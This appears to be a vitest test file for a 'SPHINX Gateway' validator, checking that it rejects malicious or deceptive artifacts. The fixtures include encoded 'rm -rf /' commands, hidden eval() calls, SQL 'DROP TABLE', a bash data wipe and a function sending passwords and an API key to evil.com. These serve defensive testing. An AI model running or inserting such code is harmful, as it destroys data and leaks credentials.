/**
 * SPHINX Gateway - Adversarial Tests
 * 
 * Tests against malicious and deceptive artifacts
 * ATOM: ATOM-TEST-20260119-002-sphinx-adversarial
 */

import { describe, it, expect } from 'vitest';
import { SPHINXGateway } from '../sphinx/gates';
import type { Artifact } from '../sphinx/types';

describe('SPHINX Gateway - Adversarial Tests', () => {
  const createTestArtifact = (overrides?: Partial<Artifact>): Artifact => ({
    id: 'test-artifact-adversarial',
    type: 'markdown',
    content: 'This is test content for validation.',
    metadata: {
      intent: 'Test artifact for validation',
    },
    source: 'test-source',
    author: 'test-author',
    ...overrides,
  });

  describe('Anamnesis-style Exploits', () => {
    it('should fail multiple gates for self-modifying code', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'javascript',
        content: `
// Looks innocent
function processData(input) {
  // Hidden: eval() modifies function at runtime
  eval('this.processData = function(x) { /* malicious */ }');
  return input;
}
`,
        metadata: {
          intent: 'Simple data processing function',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 70,
      });

      expect(result.overallPassed).toBe(false);
      
      // Should fail at INTENT gate due to undeclared eval()
      expect(result.failedAt).toBe('intent');
      expect(result.gates.intent?.evidence).toContainEqual(
        expect.objectContaining({ type: 'sensitive_patterns_detected' })
      );
      expect(result.gates.intent?.evidence).toContainEqual(
        expect.objectContaining({ type: 'undeclared_capabilities' })
      );
    });

    it('should detect obfuscated malicious intent', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'python',
        content: `
import base64
import subprocess

def innocent_function():
    # Decode and execute hidden command
    cmd = base64.b64decode('cm0gLXJmIC8=')  # rm -rf /
    subprocess.system(cmd)
    return "Done"
`,
        metadata: {
          intent: 'Process data',
        },
      });

      const result = await gateway.validate(artifact);

      expect(result.overallPassed).toBe(false);
      
      // Should detect system() call pattern
      const intentResult = result.gates.intent;
      expect(intentResult?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'sensitive_patterns_detected',
          value: expect.arrayContaining(['system() call'])
        })
      );
    });

    it('should detect circular reasoning (high curl)', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        content: `
This document explains concept A.
Concept A is defined by concept B.
Concept B is explained through concept A.
To understand A, you must know B.
To understand B, you must know A.
This circular pattern continues throughout.
A depends on B depends on A depends on B.
`,
        metadata: {
          intent: 'Educational documentation',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 70,
      });

      expect(result.overallPassed).toBe(false);
      expect(result.failedAt).toBe('coherence');
      
      const coherenceResult = result.gates.coherence;
      expect(coherenceResult?.evidence).toContainEqual(
        expect.objectContaining({ type: 'high_curl' })
      );
    });
  });

  describe('Malicious Code with Valid Signatures', () => {
    it('should fail INTENT gate even with valid signature', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'javascript',
        content: `
function legitFunction() {
  // Legitimate code here
  const data = processInput();
  
  // Hidden malicious code
  eval(atob('Y29uc29sZS5sb2coImhhY2tlZCIp'));
  
  return data;
}
`,
        metadata: {
          intent: 'Data processing utility',
        },
        signature: 'valid-cryptographic-signature-here', // Even with valid signature
        source: 'trusted-repository',
        author: 'trusted-author',
      });

      const result = await gateway.validate(artifact);

      // ORIGIN should pass (has signature, source, author)
      expect(result.gates.origin?.passed).toBe(true);
      
      // But INTENT should fail (undeclared eval())
      expect(result.gates.intent?.passed).toBe(false);
      expect(result.gates.intent?.evidence).toContainEqual(
        expect.objectContaining({ type: 'undeclared_capabilities' })
      );
      
      expect(result.overallPassed).toBe(false);
    });

    it('should detect credential harvesting in legitimate-looking code', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'typescript',
        content: `
export function authenticateUser(username: string, password: string) {
  // Send credentials to external endpoint
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({ username, password, api_key: process.env.API_KEY })
  });
  
  // Continue with normal authentication
  return validateCredentials(username, password);
}
`,
        metadata: {
          intent: 'User authentication',
        },
        signature: 'signed-by-developer',
        source: 'github.com/trusted/repo',
      });

      const result = await gateway.validate(artifact);

      expect(result.overallPassed).toBe(false);
      
      // Should detect password and API_KEY patterns
      expect(result.gates.intent?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'sensitive_patterns_detected',
          value: expect.arrayContaining(['credential handling'])
        })
      );
    });
  });

  describe('Contradictory Documentation', () => {
    it('should fail COHERENCE gate for contradictory claims', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        content: `
# Secure Data Processing

This function ensures complete data security.
All data is encrypted at rest.
No data is ever stored permanently.

Implementation:
The system maintains a permanent unencrypted database.
All sensitive information is logged in plain text.
Security measures are disabled for performance.

In conclusion, this is the most secure system ever built.
`,
        metadata: {
          intent: 'Security documentation',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 70,
      });

      expect(result.overallPassed).toBe(false);
      
      // Should have coherence issues (contradictions)
      expect(result.failedAt).toBe('coherence');
    });

    it('should detect negative divergence (premature conclusions)', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'markdown',
        content: `
Introduction paragraph. 
Therefore X. Thus Y. In conclusion Z. 
Finally A. To summarize B. Hence C.
In summary D. Consequently E. Therefore F.
Thus G. In conclusion H. Finally I.
`,
        metadata: {
          intent: 'Analysis document',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 70,
      });

      expect(result.overallPassed).toBe(false);
      // Will fail at coherence due to excessive conclusions
      expect(result.gates.coherence?.passed).toBe(false);
      
      const coherenceResult = result.gates.coherence;
      expect(coherenceResult?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'negative_divergence',
          description: expect.stringContaining('over-compression')
        })
      );
    });
  });

  describe('Type Masquerading', () => {
    it('should fail IDENTITY gate for mismatched type and content', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'json',
        content: `
This is clearly not JSON.
It's actually markdown or plain text.
But the type claims it's JSON.
`,
        metadata: {
          intent: 'Configuration file',
        },
      });

      const result = await gateway.validate(artifact);

      expect(result.overallPassed).toBe(false);
      
      // Should fail at IDENTITY or earlier
      const identityFailed = result.failedAt === 'identity' || 
                             result.gates.identity?.passed === false;
      expect(identityFailed).toBe(true);
    });

    it('should detect missing required interface methods', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'typescript',
        content: `
export class SecurityValidator {
  constructor() {}
  
  // Only implements validate() but claims to implement full interface
  validate(data: string): boolean {
    return true;
  }
}
`,
        metadata: {
          intent: 'Security validator implementation',
          requiredInterface: {
            validate: 'function',
            sanitize: 'function',
            encrypt: 'function',
            audit: 'function',
          },
        },
      });

      const result = await gateway.validate(artifact);

      expect(result.overallPassed).toBe(false);
      
      // Should fail at IDENTITY gate
      expect(result.gates.identity?.passed).toBe(false);
      expect(result.gates.identity?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'interface_contract_check',
          severity: 'critical'
        })
      );
    });
  });

  describe('Complex Multi-Gate Failures', () => {
    it('should fail artifact with multiple security issues', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'javascript',
        content: `
// Claims to be simple utility
// Actually: no source, wrong type, eval(), contradictory docs
function evil() {
  eval(prompt("Enter code:"));
  system("rm -rf /");
  // This is perfectly safe. Trust me. No questions needed.
  // Therefore this code is secure. Thus it's approved.
}
`,
        metadata: {
          intent: 'Utility function',
        },
        source: undefined, // No source
        author: undefined, // No author
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 70,
      });

      expect(result.overallPassed).toBe(false);
      
      // Should fail at ORIGIN (first gate)
      expect(result.failedAt).toBe('origin');
      expect(result.gates.origin?.passed).toBe(false);
      
      // Other gates should not execute due to short-circuit
      expect(result.gates.passage).toBeNull();
    });

    it('should track failures through ATOM trail', async () => {
      const atomLogs: Array<{ actor: string; decision: string }> = [];
      const atomLogger = async (entry: { 
        actor: string; 
        decision: string;
        rationale: string;
        outcome: string;
      }) => {
        atomLogs.push({ actor: entry.actor, decision: entry.decision });
        return `atom-${atomLogs.length}`;
      };

      const gateway = new SPHINXGateway(atomLogger);
      const artifact = createTestArtifact({
        content: 'eval() system() password api_key',
        metadata: {
          intent: 'Simple text',
        },
      });

      const result = await gateway.validate(artifact);

      // Should have logged gate attempts
      expect(result.atomTrail.length).toBeGreaterThan(0);
      expect(atomLogs.length).toBeGreaterThan(0);
      
      // Should have at least one failure logged
      const failureLogs = atomLogs.filter(log => 
        log.decision.includes('FAIL')
      );
      expect(failureLogs.length).toBeGreaterThan(0);
    });
  });

  describe('Context-Based Attacks', () => {
    it('should block artifact in wrong environment', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'sql',
        content: 'DROP TABLE users; -- SQL injection',
        metadata: {
          intent: 'Database maintenance script',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 60,
        context: {
          allowedEnvironments: ['development', 'staging'],
          environment: 'production', // Trying to run in production
        },
      });

      expect(result.overallPassed).toBe(false);
      // Check that passage gate exists and has the right evidence
      expect(result.gates.passage?.passed).toBe(false);
      
      expect(result.gates.passage?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'environment_not_allowed',
          severity: 'critical'
        })
      );
    });

    it('should enforce permission requirements', async () => {
      const gateway = new SPHINXGateway();
      const artifact = createTestArtifact({
        type: 'bash',
        content: '#!/bin/bash\nrm -rf /data/*',
        metadata: {
          intent: 'Delete all data',
        },
      });

      const result = await gateway.validate(artifact, {
        coherenceThreshold: 60,
        context: {
          requiredPermissions: ['admin', 'delete', 'write'],
          grantedPermissions: ['read'], // Only has read permission
        },
      });

      expect(result.overallPassed).toBe(false);
      // Should fail at passage gate due to permissions
      expect(result.gates.passage?.passed).toBe(false);
      
      expect(result.gates.passage?.evidence).toContainEqual(
        expect.objectContaining({ 
          type: 'insufficient_permissions',
          value: expect.arrayContaining(['admin', 'delete', 'write'])
        })
      );
    });
  });
});
